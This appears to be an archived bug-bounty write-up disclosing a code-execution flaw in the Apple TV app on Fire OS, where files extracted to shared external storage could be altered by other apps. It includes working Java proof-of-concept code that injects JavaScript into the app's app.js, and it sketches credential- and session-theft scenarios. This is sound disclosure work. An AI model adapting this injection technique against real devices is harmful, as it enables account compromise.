---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-04-05_apple-tv-for-fire-os-code-execution.md
original_filename: 2021-04-05_apple-tv-for-fire-os-code-execution.md
title: Apple TV for Fire OS code execution
category: documents
detected_topics:
- mobile-security
- command-injection
- path-traversal
- otp
- api-security
- supply-chain
tags:
- imported
- documents
- mobile-security
- command-injection
- path-traversal
- otp
- api-security
- supply-chain
language: en
raw_sha256: fbd3ae03db044cbdc9e96062010ebb0580ebe588ec67bde079ec3d1db65c24f2
text_sha256: 2a20138c7738e7e26427bd006ffbd784d3c6b286369bf97ea654e608d7be0b4a
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: false
---

# Apple TV for Fire OS code execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-04-05_apple-tv-for-fire-os-code-execution.md
- Source Type: markdown
- Detected Topics: mobile-security, command-injection, path-traversal, otp, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: False
- Raw SHA256: `fbd3ae03db044cbdc9e96062010ebb0580ebe588ec67bde079ec3d1db65c24f2`
- Text SHA256: `2a20138c7738e7e26427bd006ffbd784d3c6b286369bf97ea654e608d7be0b4a`


## Content

---
title: "Apple TV for Fire OS code execution"
page_title: "Apple TV for Fire OS code execution :: Razvan Sima"
url: "https://0xra.github.io/posts/apple-tv-code-execution/"
final_url: "https://0xra.github.io/posts/apple-tv-code-execution/"
authors: ["Razvan Sima (@0xraaz)"]
programs: ["Apple"]
bugs: ["RCE", "Insecure storage", "Man-in-the-Disk attack"]
publication_date: "2021-04-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3757
---

# [Apple TV for Fire OS code execution](/posts/apple-tv-code-execution/)

* * *

Table of Contents

  * TL; DR
  * Story
  * Why?
  * What’s the problem?
  * POC
  * Video
  * Conclusion
  * Fix
  * Timeline

* * *

## TL; DR

Any app on Fire OS that has been granted permission to use external storage can execute code in the context of the Apple TV app.

## Story

While bored during lockdown I wanted to port the Apple TV app to my Android TV so that I didn’t have to use my Fire TV stick. While looking into this I found a very interesting behavior, the Apple TV app on Fire OS was writing files to external storage and then executing the files.

This is a very odd behavior but not uncommon for Android apps to write files to external storage, and there’s been previous [research](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/) that shows how dangerous this can be. However, in this case the Apple TV app directly executes files from external storage.

### Why?

After more time spent looking into why you would need to extract files and then execute them, it turns out the Apple TV app on Fire OS actually has another app embedded within the APK as a zip file which is then extracted and executed.

![resources](resources.png) ![extract](extract.png)

What’s in the zip file? Well, it contains a NodeJS like app that uses a framework called Luna. Could this be the same Luna that is on webOS running on LG TVs? Possibly - and it could mean that other ported versions of the Apple TV app are affected by this issue.

![other](other.png)

Back to our problem, we know that the Apple TV app extracts the embedded app from the zip into external storage and then the NodeJS app takes over and handles all the logic/UI stuff. Let’s explore further.

### What’s the problem?

A quick background on Android storage, there are 2 types of storage that developers can use (1) Internal storage which is protected from other apps and (2) External storage which is shared between all apps and has some basic protections. External storage exists as an emulated storage on devices which don’t have a physical external storage.

Android apps can use external storage without having to ask the user for permission. This is the default behavior and is also how the Apple TV app uses external storage.

![getExternalFilesDirs](getExternalFilesDirs.png)

Android apps can write to external storage by default using `getExternalFilesDirs` method and similar APIs. This will give apps access to special folders in the external storage which are protected from other applications but ONLY if the other apps don’t have the external storage permission granted.

For example, by default apps can use `getExternalFilesDirs` and write to their folder:
  
  
  /storage/emulated/0/Android/data/<my package name>/files
  

But can NOT read or write to other apps’ folder:
  
  
  /storage/emulated/0/Android/data/<other package name>/files
  

Any app can ask the user for permission to use external storage however it pleases, and if the user agrees, the app will be granted the `WRITE_EXTERNAL_STORAGE` permission. This will allow to write to any folder or file owned by the group `sdcard_rw` under the folder:
  
  
  /storage/emulated/0
  

These are the contents of external storage after the Apple TV app extracts the embedded zip file:

![external](external.png)

Note the group owner is `sdcard_rw` which is given to all apps that have been granted the external storage permission by the user.

## POC

For our POC exploit we are going to autogenerate a Hello World app using Android Studio and add some logic for permission request and writing to external storage. Then we modify a script (app.js) in the Apple TV app’s external storage with our exploit code.

Before we proceed, we need to make sure our special permissions are added to the `AndroidManifest.xml` file.
  
  
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
  

We can start with a `MainActivity` that looks similar to this:
  
  
  public class MainActivity extends Activity
  implements ActivityCompat.OnRequestPermissionsResultCallback {
  
  private static final String TAG = "MainActivity";
  private static final int PERMISSION_WRITE_EXTERNAL_STORAGE = 10;
  
  @Override
  public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.activity_main);
  
  if (ActivityCompat.checkSelfPermission
  (this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
  == PackageManager.PERMISSION_GRANTED) {
  startExploit();
  } else {
  requestPermission();
  }
  
  }
  

In `onCreate` we begin with a check to see if the user granted the external storage permission and if not then we request it. If the permission is granted then we can proceed with the exploit.

The permission request logic is shown in the code below:
  
  
  private void requestPermission() {
  ActivityCompat.requestPermissions(this,
  new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_WRITE_EXTERNAL_STORAGE);
  }
  

Once the user accepts or denies the permission our code contained in the following method will be called:
  
  
  @Override
  public void onRequestPermissionsResult(int requestCode,
  @NonNull String[] permissions,
  @NonNull int[] grantResults) {
  if (requestCode == PERMISSION_WRITE_EXTERNAL_STORAGE) {
  if (grantResults.length == 1 &&
  grantResults[0] == PackageManager.PERMISSION_GRANTED) {
  startExploit();
  }
  }
  }
  

We only check if the permission is granted and then run the exploit contained in the following snippet:
  
  
  private void startExploit() {
  try {
  File file = new File("/storage/emulated/0/Android/data/com.apple.atve.amazon.appletv/files/app/app.js");
  int length = (int) file.length();
  byte[] bytes = new byte[length];
  try (FileInputStream in = new FileInputStream(file)) {
  in.read(bytes);
  }
  String toFind = "async firmwareCheck(){";
  String inject = "const b=new _t('ok',{title:'OK'});await Zt.run({title:'Oh No!',body:'Something bad just happened :(',buttons:[b]});";
  String contents = new String(bytes);
  if (contents.contains(inject)) {
  return;
  }
  contents = contents.replace(toFind, toFind + inject);
  try (FileOutputStream stream = new FileOutputStream(file)) {
  stream.write(contents.getBytes());
  }
  }
  catch (Exception e) {
  Log.e(TAG, e.toString());
  }
  }
  

The exploit unfolds in the following steps:

  1. The file at /storage/emulated/0/Android/data/com.apple.atve.amazon.appletv/files/app/app.js is read in a local variable.
  2. If our exploit code already exists in the file we exit.
  3. We search for the method `firmwareCheck` in the file contents and add our code inside it.

The resulting `firmwareCheck` method in `app.js` looks like this:
  
  
  async firmwareCheck(){
  const b = new _t('ok', {
  title: 'OK'
  });
  await Zt.run({
  title: 'Oh No!',
  body: 'Something bad just happened :(',
  buttons: [b]
  });
  // original method goes here
  }
  

The exploit code creates a new AlertPage and waits for it to be dismissed by the user before continuing. Every time the Apple TV application is opened from now on our code will be executed as well.

Please note that because of minification this exploit POC may not work in your case depending on the version of the app. The `_t` and `Zt` variables in the exploit need to be your corresponding references to `ButtonWidget` and `AlertPage`.

## Video

In the video below the POC is a bit more advanced and shows the contents of `LunaSecureStorage` which stores session info and cookies. How to accomplish this is left as an exercise for the reader.

Your browser doesn't support embedded videos, but don't worry, you can [download it](/posts/apple-tv-code-execution/apple_test.mp4) and watch it with your favorite video player!

## Conclusion

With this simple exploit we demonstrate how an attack may unfold. There are far more devastating scenarios that a real attacker may create in order to compromise user accounts. For example, it could be possible to fake a re-authentication page and steal user credentials, or show a page that would ask the user to update their payment details. It could also be used to launch a silent exploit that steals the current session token and performs actions on behalf of the user in the background or at a later date. Additionally, the user wouldn’t need to open the attacker app, instead a malicious app could be running in the background since its installation and perform the exploit without user input.

## Fix

Apple fixed the issue in version 5.1 by extracting the zip file to internal storage.

![fix](fix.png)

As part of the fix, the new version also deletes old content in external storage.

All versions before 5.1 should be vulnerable to this issue, however, I only verified the POC on 4.0, 4.1, and 5.0.

## Timeline

2020-07-04: Issue reported to Apple, including writeup, POC code, and video

2020-07-08: Investigation started by Apple

2020-09-09: Apple confirmed a fix is coming in November and asked to hold disclosure

2020-10-26: I noticed version 5.1 of the app fixes the issue and asked Apple if I can now disclose the issue

2020-10-27: Apple asked to withhold disclosure until the issue is credited in their advisory

2021-02-17: After months of monitoring for new security advisories, I asked Apple when will the advisory be published

2021-03-19: Apple confirms I can disclose the issue and advisory is published <https://support.apple.com/HT212197>

UPDATE:

2021-04-06: The report is in queue to be adjudicated for an Apple Security Bounty
